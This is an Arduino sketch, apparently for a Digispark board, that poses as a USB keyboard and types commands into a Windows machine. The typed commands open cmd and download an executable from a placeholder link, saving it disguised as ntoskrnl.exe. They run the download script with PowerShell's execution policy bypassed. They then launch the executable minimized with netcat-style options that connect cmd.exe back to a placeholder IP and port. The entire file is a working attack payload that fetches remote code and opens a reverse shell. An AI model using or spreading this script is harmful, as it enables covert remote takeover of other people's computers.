#include "DigiKeyboardDe.h"
void setup() {
  // put your setup code here, to run once:
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd / & mkdir win & cd /win & echo (wget 'LINK' -OutFile ntoskrnl.exe) > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("START /MIN ntoskrnl.exe IP PORT -e cmd.exe -d & exit");
  DigiKeyboard.delay(50);
}

void loop() {
  // put your main code here, to run repeatedly:
  // Usless
}
